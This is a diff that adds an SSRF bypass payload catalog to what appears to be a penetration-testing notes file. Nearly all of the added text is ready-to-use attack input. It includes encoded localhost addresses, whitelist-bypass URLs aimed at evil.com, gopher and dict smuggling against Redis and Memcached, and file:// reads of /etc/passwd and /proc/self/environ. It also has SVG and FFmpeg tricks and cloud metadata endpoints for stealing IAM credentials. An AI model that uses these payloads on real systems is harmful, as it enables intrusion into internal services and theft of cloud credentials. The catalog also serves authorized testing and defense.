@@ -108,6 +108,201 @@ curl -X POST "${DJANGO_APP}/accounts/password/reset/" \
   -d "email=test@test.com"
 ```
 
+## SSRF Bypass Payload Catalog
+
+### IP Address Encoding (localhost / 127.0.0.1)
+
+```bash
+# Standard
+http://127.0.0.1
+http://localhost
+
+# Decimal
+http://2130706433
+
+# Hex (various formats)
+http://0x7f000001
+http://0x7f.0x0.0x0.0x1
+http://0x7F.1
+
+# Octal
+http://0177.0.0.01
+http://0177.0001.0001
+http://017700000001
+
+# IPv6
+http://[::1]
+http://[::]:80/
+http://[0000::1]:80/
+http://0000::1:80/
+
+# Mixed encoding
+http://127.1
+http://127.0.1
+http://127.00.1
+http://127.0.01
+http://0.0.0.0
+http://0
+
+# Zero-padded
+http://127.000.000.001
+http://0000.0000.0000.0000
+
+# URL encoding
+http://%31%32%37%2e%30%2e%30%2e%31
+http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
+
+# Enclosed alphanumeric (Unicode)
+https://ⓁⓄⒸⒶⓁⒽⓄⓈⓉ
+https://⑯⑨.②⑤④.⑯⑨.②⑤④
+
+# Credential-based bypass
+http://whitelisted@127.0.0.1
+http://127.0.0.1@whitelisted.com
+```
+
+### Whitelist/Filter Bypass Patterns
+
+```bash
+# Fragment bypass
+http://safesite.com#.evil.com
+http://safesite.com#@evil.com
+
+# Query string bypass
+http://safesite.com?.evil.com
+http://safesite.com&evil.com
+
+# Backslash bypass
+http://safesite.com\.evil.com/path
+
+# @ credential bypass
+http://evil.com@safesite.com
+http://safesite.com@evil.com
+
+# Multiple slashes
+http://////////////evil.com/
+
+# URL-within-URL
+http://safesite.com/redirect?url=http://evil.com
+
+# DNS rebinding (use rebind.network or similar)
+# First resolution → whitelisted IP, second → 127.0.0.1
+http://7f000001.c0a80001.rbndr.us  # Resolves randomly to 127.0.0.1 or 192.168.0.1
+```
+
+### Protocol Smuggling
+
+```bash
+# Gopher (Redis, Memcached, SMTP exploitation)
+gopher://127.0.0.1:6379/_INFO
+gopher://127.0.0.1:6379/_SET%20pwned%20true
+gopher://127.0.0.1:11211/_stats
+
+# Dict
+dict://127.0.0.1:6379/INFO
+dict://attacker:11111/
+
+# File
+file:///etc/passwd
+file:///proc/self/environ
+file:///proc/net/tcp
+
+# SFTP (leaks SSH banner)
+sftp://evil.com:11111/
+
+# TFTP
+tftp://evil.com:12346/TESTUDPPACKET
+
+# LDAP
+ldap://localhost:11211/%0astats%0aquit
+```
+
+### SSRF via Content Types
+
+```bash
+# PDF rendering (SVG with iframe)
+<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="800" height="500">
+  <foreignObject width="800" height="500">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
+    </body>
+  </foreignObject>
+</svg>
+
+# Video upload (FFmpeg HLS SSRF)
+# Create m3u8 pointing to internal service
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+#EXT-X-ENDLIST
+
+# Image URL in profile/avatar
+# Many apps fetch remote images server-side for resizing
+```
+
+### Cloud Metadata Endpoints
+
+```bash
+# AWS (IMDSv1)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+
+# AWS (IMDSv2 — requires PUT for token, harder via SSRF)
+# But some SSRF allows custom methods
+
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Requires header: Metadata-Flavor: Google
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Requires header: Metadata: true
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1/
+
+# Kubernetes
+https://kubernetes.default.svc/api/v1/namespaces
+https://kubernetes.default.svc/api/v1/secrets
+
+# Docker
+http://127.0.0.1:2375/containers/json
+
+# Consul
+http://127.0.0.1:8500/v1/agent/self
+
+# ECS Container credentials
+http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+```
+
+### Blind SSRF Discovery Locations
+
+Common input fields where blind SSRF hides:
+- Contact/review forms (URL fields fetched for preview)
+- Webhook configuration endpoints
+- PDF/report generation (HTML → PDF with external resources)
+- Image/avatar upload by URL
+- Import from URL features (CSV, XML, JSON)
+- OAuth callback URLs
+- Email headers (X-Mailer fetching tracking pixels)
+- User-Agent / Referer (logged and fetched by analytics)
+- Video embed URLs (thumbnail fetch)
+- RSS/Atom feed URLs
+
+### IP Converter Tool
+
+```bash
+# Quick conversion: https://h.43z.one/ipconverter/
+# Or use Python:
+python3 -c "import ipaddress; ip=ipaddress.ip_address('169.254.169.254'); print(f'Decimal: {int(ip)}'); print(f'Hex: 0x{int(ip):08x}')"
+# Output: Decimal: 2852039166, Hex: 0xa9fea9fe
+```
+
+---
+
 ## Indicators That SSRF Won't Work
 
 | Signal | Meaning |
